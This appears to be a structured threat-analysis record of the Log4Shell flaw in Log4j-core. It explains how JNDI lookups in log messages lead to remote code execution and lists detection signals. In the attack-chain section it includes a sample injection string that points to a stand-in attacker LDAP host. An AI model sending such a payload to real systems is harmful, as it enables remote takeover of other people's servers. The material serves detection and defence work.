package_info.why_malicious: These versions of Log4j-core contain a critical vulnerability (CVE-2021-44228, CVE-2021-45046, CVE-2021-44832) that allows attackers to inject malicious JNDI lookup patterns into log messages, resulting in arbitrary code execution. The vulnerability is not due to intentionally malicious code, but the effect is equivalent to a supply chain compromise, as attackers can exploit the package to execute arbitrary code remotely.

execution_context.file_location: Any Java source file using Log4j logging methods (e.g., Logger.info, Logger.error, Logger.printf)

malicious_snippets.code_behavior: At runtime, when a log message containing this pattern is processed, Log4j performs a JNDI lookup to the specified LDAP server, retrieves a remote Java class, and executes it, enabling arbitrary code execution.

malice_analysis.why_suspicious: This pattern causes the application to reach out to an attacker-controlled LDAP server and load/execute remote code, which is a classic remote code execution vector.
malice_analysis.violated_expectations: Normal logging should never trigger network requests or code execution based on log message content. Here, user input in logs leads to code execution.
malice_analysis.similar_legitimate_use: JNDI lookups are sometimes used for legitimate resource resolution in enterprise Java apps, but not based on untrusted log message content.
key_indicators: LDAP/S remote lookups triggered by log content
Execution of code fetched from remote servers

malicious_snippets.code_behavior: At runtime, this configuration enables message lookups in log messages, allowing attacker-controlled input to trigger JNDI lookups and potentially execute remote code.

malice_analysis.why_suspicious: Enabling lookups in log message patterns allows untrusted input to be interpreted as code or resource locators, which is highly dangerous.
malice_analysis.violated_expectations: Logging configuration should not allow user input to trigger code execution or network access.
malice_analysis.similar_legitimate_use: Lookups can be used for dynamic log enrichment in trusted environments, but not with untrusted input.
key_indicators: Lookups enabled in log message formatting

execution_context.file_location: Any Java source file using Logger.printf or similar methods

malicious_snippets.code_behavior: At runtime, if userInput contains a JNDI lookup pattern, Log4j will process it, potentially triggering a remote JNDI lookup and arbitrary code execution.

malice_analysis.why_suspicious: Logging user-controlled input without sanitization allows attackers to inject malicious lookup patterns.
malice_analysis.violated_expectations: Logging should treat input as data, not as code or resource locators.
malice_analysis.similar_legitimate_use: Logging user input is common, but not with unsanitized lookups enabled.
key_indicators: Use of Logger.printf with user-controlled variables

execution_context.trigger: runtime (when JndiLookup class is present on classpath)

malicious_snippets.code_snippet: JndiLookup.class (enables JNDI lookups in log messages)
malicious_snippets.code_behavior: At runtime, the presence of this class allows Log4j to process JNDI lookups in log messages, enabling the attack vector.

malice_analysis.why_suspicious: The JndiLookup class enables the dangerous lookup mechanism that is exploited in this vulnerability.
malice_analysis.violated_expectations: Normal logging libraries should not allow arbitrary code execution via log message content.
malice_analysis.similar_legitimate_use: JndiLookup is used for legitimate resource resolution in trusted environments.
key_indicators: Presence of JndiLookup.class in log4j-core JAR

attack_chain.action: Attacker sends a crafted log message containing a JNDI lookup pattern (e.g., ${jndi:ldap://attacker.com/a}) to the vulnerable application.
attack_chain.leads_to: Log4j processes the log message and triggers a JNDI lookup.

attack_chain.action: Log4j, with lookups enabled (via %m{lookups} or default settings), interprets the pattern and initiates a JNDI request to the attacker-controlled server.
attack_chain.leads_to: Application connects to the attacker's LDAP server.

attack_chain.action: The attacker’s LDAP server responds with a reference to a remote Java class file, which Log4j loads and executes.
attack_chain.leads_to: Arbitrary code execution in the context of the vulnerable application.

behavioral_signatures: Unexpected outbound LDAP/S or RMI network connections from application servers
Presence of JndiLookup.class in log4j-core JARs
network_indicators: Outbound LDAP/S or RMI connections to untrusted or external hosts
Connections to attacker-controlled domains or IPs specified in JNDI patterns
detection_knowledge.how_to_detect: Monitor application logs for suspicious ${jndi:...} patterns, audit log4j configuration files for PatternLayout with %m{lookups}, and scan for the presence of JndiLookup.class in deployed log4j-core JARs. Monitor network traffic for unexpected outbound LDAP/S or RMI connections, especially to external or untrusted hosts. Use runtime instrumentation or WAF rules to block or alert on JNDI lookup patterns in user input.
